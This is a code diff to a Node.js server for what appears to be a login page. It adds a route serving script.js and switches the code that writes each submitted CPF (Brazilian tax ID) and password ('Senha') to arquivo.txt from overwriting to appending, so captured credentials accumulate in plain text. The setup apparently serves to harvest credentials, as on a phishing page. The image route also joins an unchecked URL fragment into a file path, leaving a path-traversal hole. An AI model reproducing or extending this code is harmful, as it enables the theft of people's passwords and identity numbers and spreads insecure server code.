@@ -20,7 +20,19 @@ const server = http.createServer((req,res)=>{
           res.write(data);
           return res.end();
         });
-      }  else if (req.url.startsWith('/images/')) { // Supondo que as imagens estão em um diretório chamado 'images'
+      }  else if (req.url === '/script.js') { // Condition to serve the script file
+        fs.readFile(path.join(__dirname, 'site-login', 'script.js'), (err, data) => { // Read the script file
+          if (err) {
+            res.writeHead(404, { 'Content-Type': 'text/plain' });
+            res.write('404 Not Found');
+            return res.end();
+          }
+          res.writeHead(200, { 'Content-Type': 'application/javascript' }); // Set the content type to JavaScript
+          res.write(data);
+          return res.end();
+        });
+    
+      } else if (req.url.startsWith('/images/')) { // Supondo que as imagens estão em um diretório chamado 'images'
         const imageName = req.url.substring(8); // Remover '/images/' do início do URL
         fs.readFile(path.join(__dirname, 'site-login', 'images', imageName), (err, data) => {
           if (err) {
@@ -44,7 +56,7 @@ const server = http.createServer((req,res)=>{
         })
     }else{
         const fileContent = `CPF: ${cpf}, Senha: ${senha}\n`;
-        fs.writeFile('arquivo.txt',fileContent,(err)=>{
+        fs.appendFile('arquivo.txt',fileContent,(err)=>{
             if(err){
                 console.log('Erro: ', err)
             }
